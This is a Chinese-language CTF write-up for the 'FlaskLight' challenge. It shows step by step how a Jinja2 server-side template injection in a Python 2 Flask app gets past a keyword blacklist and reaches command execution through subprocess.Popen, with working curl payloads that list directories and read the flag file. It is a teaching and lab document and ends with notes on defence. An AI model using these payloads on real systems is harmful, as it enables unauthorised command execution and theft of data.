---
title: "[CSCCTF 2019 Qual] FlaskLight"
date: 2026-05-28
categories:
  - CTF
  - Web
tags:
  - CTF
---

# [CSCCTF 2019 Qual] FlaskLight

## 题目信息

- **URL**: http://xxx.node5.buuoj.cn:81/
- **类型**: WEB - Flask SSTI（服务端模板注入）
- **考点**: Python2 Flask/Jinja2 SSTI，绕过黑名单实现 RCE

## 信息收集

访问首页，得到一个 Flask 应用，页面标题为 "Flasklight"。

HTTP 响应头：
```
HTTP/1.1 200 OK
Server: openresty
Content-Type: text/html; charset=utf-8
```

页面 HTML 关键部分：
```html
<h2>You searched for:</h2>
<h3>None</h3>
<h2>Here is your result</h2>
<h3>[]</h3>
<!-- Parameter Name: search -->
<!-- Method: GET -->
```

页面注释提示参数 `search` 通过 GET 方式传递。带上 `?search=test` 测试，发现输入被原样显示在 "You searched for" 区域。

## 漏洞分析

题目名称 "FlaskLight" 强烈暗示 Flask SSTI。尝试 SSTI 经典探测 payload `{{7*7}}`，返回 500 错误 — `{` 字符触发了 Nginx/openresty 层面的拦截。改用 URL 编码 `%7B%7B7*7%7D%7D` 后，页面显示 `49`，证实了 SSTI **（Server-Side Template Injection，服务端模板注入）**漏洞的存在。

读取 `config` 获得 Flask 配置信息：
```bash
curl -s "http://target:81/?search={{config}}"
```
返回：
```python
<Config {..., 'SECRET_KEY': 'CCC{f4k3_Fl49_:v} CCC{the_flag_is_this_dir}', ...}>
```

其中的 `CCC{the_flag_is_this_dir}` 提示 flag 是一个文件，位于当前目录下。

进一步通过 SSTI 读取后端源码 `/flasklight/app.py`：
```bash
curl -s "http://target:81/?search={{''.__class__.__mro__[2].__subclasses__()[258]('cat /flasklight/app.py', shell=True, stdout=-1).communicate()[0].strip()}}"
```
完整源码如下，由此得知了黑名单`blacklist = ['url_for', 'listdir', 'globals']`：

```python
from flask import Flask, request, render_template_string, abort

app = Flask(__name__)
app.secret_key = 'CCC{f4k3_Fl49_:v} CCC{the_flag_is_this_dir}'

@app.route("/")
def search():
    blacklist = ['url_for', 'listdir', 'globals']
    search = request.args.get('search') or None
    if search is not None:
        for black in blacklist:
            if black in search:
                abort(500)
    # ...
    return render_template_string('''...<h3>%s</h3>...''' % (search, result))
```
 关键发现：

- 使用 `render_template_string` 直接渲染用户输入，导致 SSTI
- 存在黑名单过滤：`url_for`、`listdir`、`globals`
- 但黑名单不包含 `__class__`、`__mro__`、`__subclasses__` 等 Python 内省属性

### 漏洞原理

1. **模板注入点**：`render_template_string()` 会对拼接后的字符串进行 Jinja2 模板渲染。虽然参数通过 `%s` 格式化插入，但插入后的内容仍会被 Jinja2 解析，因此 `{{ }}` 语法中的表达式会被执行。

2. **黑名单绕过**：仅过滤了 `url_for`、`listdir`、`globals` 三个关键字，使用 `__class__.__mro__` 等方式完全可以绕过。由于 `globals` 被过滤，不能直接使用 `config.__class__.__init__.__globals__` 等常见路径。改用 `__subclasses__()` 方法枚举所有子类，找到 `subprocess.Popen` 来执行系统命令。

3. **Python2 环境**：枚举子类时出现 `<type 'unicode'>`，这是 Python2 独有的类型，表明该环境为 Python2。在 Python2 中，`''.__class__.__mro__` 为 `(str, basestring, object)`，因此需要用 `__mro__[2]` 获取 `object` 基类（Python3 中 `object` 在索引 1）。

### SSTI 利用链（Python2）

```
''.__class__            → <type 'str'>
  .__mro__[2]           → <type 'object'>
  .__subclasses__()     → 所有 object 子类列表
  [258]                 → <class 'subprocess.Popen'>
  ('command', shell=True, stdout=-1)
  .communicate()[0]     → 命令输出
```

## 漏洞利用

### Step 1: 确认 SSTI

```bash
# URL 编码 bypass
curl -s "http://target:81/?search={{7*7}}"
# 输出 49，确认模板注入
```

### Step 2: 枚举子类，定位 subprocess.Popen

先获取 `object` 的所有子类，并用 Python 脚本提取、编号：

```bash
# 获取 object 所有子类，并按行编号输出
curl -s "http://target:81/?search={{''.__class__.__mro__[2].__subclasses__()}}" \
  | python3 -c "import sys,html,re;t=sys.stdin.read();m=re.search(r'<h3>(.*?)</h3>',t);[print(f'{i}: {x}') for i,x in enumerate(html.unescape(m.group(1)).split(', '))] if m else print('no match')"
```

可执行版本 （{} \[] 要进行url编码）
```bash
curl -s "http://6c46ad25-ad97-4878-8bab-f3585bec1903.node5.buuoj.cn:81/?search=%7B%7B%27%27.__class__.__mro__%5B2%5D.__subclasses__%28%29%7D%7D" | python3 -c " import sys, html, re text = sys.stdin.read() m = re.search(r'<h3>(.*?)</h3>', text) if m: items = html.unescape(m.group(1)).split(', ') for i, item in enumerate(items): print(f'{i}: {item}') "
```


![](assets/file-20260528152853227.png)
`curl` 获取原始 HTML，管道传给 Python 脚本：
- `re.search(r'<h3>(.*?)</h3>', ...)` 从 HTML 中提取出搜索结果
- `html.unescape()` 解码 `&#39;` `&lt;` `&gt;` 等 HTML 实体
- 按 `, ` 拆分后逐行打印，每行前带序号

然后在输出中搜索 `popen` 定位目标类：

```bash
# 直接在输出中搜索 Popen，无需先列全部再手动翻
curl -s "http://target:81/?search={{''.__class__.__mro__[2].__subclasses__()}}" \
  | python3 -c "import sys,html,re;t=sys.stdin.read();m=re.search(r'<h3>(.*?)</h3>',t);[print(f'{i}: {x}') for i,x in enumerate(html.unescape(m.group(1)).split(', ')) if 'popen' in x.lower()] if m else print('no match')"
```

输出：
```
258: <class 'subprocess.Popen'>
```

由此确定 `subprocess.Popen` 位于索引 **258**。实际做题中不需要手数，脚本编号 + grep 即可快速定位。

### Step 3: 执行命令列出文件

```bash
# ls -la /
curl -s "http://target:81/?search={{''.__class__.__mro__[2].__subclasses__()[258]('ls -la', shell=True, stdout=-1).communicate()[0].strip()}}"
```

增加可读性shell语句
```bash
# 先定义 payload（可读性强，方便修改）
payload="{{''.__class__.__mro__[2].__subclasses__()[258]('ls -la', shell=True, stdout=-1).communicate()[0].strip()}}" 
# 一键编码并请求 
encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$payload'''))") curl -s "http://6c46ad25-ad97-4878-8bab-f3585bec1903.node5.buuoj.cn:81/?search=$encoded" | grep -A 100 "You searched for:"
```
返回结果：
```
drwxr-xr-x 1 root root 4096 May 28 06:25 flasklight
...
```


结果发现 `/flasklight` 目录，进一步列出该目录：
```bash
curl -s "http://target:81/?search={{''.__class__.__mro__[2].__subclasses__()[258]('ls -la /flasklight', shell=True, stdout=-1).communicate()[0].strip()}}"
```

返回：
```
-rw-rw-r-- 1 root root 1571 Apr 11  2020 app.py
-rw-r--r-- 1 root root   43 May 28 06:25 coomme_geeeett_youur_flek
```

### Step 4: 读取 Flag

```bash
# cat /flasklight/coomme_geeeett_youur_flek
curl -s "http://target:81/?search={{''.__class__.__mro__[2].__subclasses__()[258]('cat /flasklight/coomme_geeeett_youur_flek', shell=True, stdout=-1).communicate()[0].strip()}}"
```

## 获取 Flag

```
flag{2ec63ee1-2b40-4ced-aa2b-5a6b62834a9d}
```

## 知识点总结

- **Flask SSTI**：当 `render_template_string()` 的参数中包含用户可控输入时，Jinja2 模板语法 `{{ }}` 会被执行
- **Python2 vs Python3 MRO 差异**：Python2 中 `str.__mro__` 包含 `basestring`，`object` 在索引 2；Python3 中 `object` 在索引 1
- **Python SSTI 到 RCE**：通过 `object.__subclasses__()` 枚举所有子类，找到 `subprocess.Popen` 即可执行系统命令
- **WAF 绕过**：前端的 Nginx/openresty 可能拦截 `{` `}` 字符，URL 编码可以有效绕过
- **黑名单绕过**：`url_for`、`listdir`、`globals` 的黑名单不包含 `__class__`、`__mro__`、`__subclasses__` 等属性，防御效果有限
- **SSTI 防御**：应使用 Jinja2 沙箱、限制可访问的属性方法，或彻底避免将用户输入传入模板渲染函数
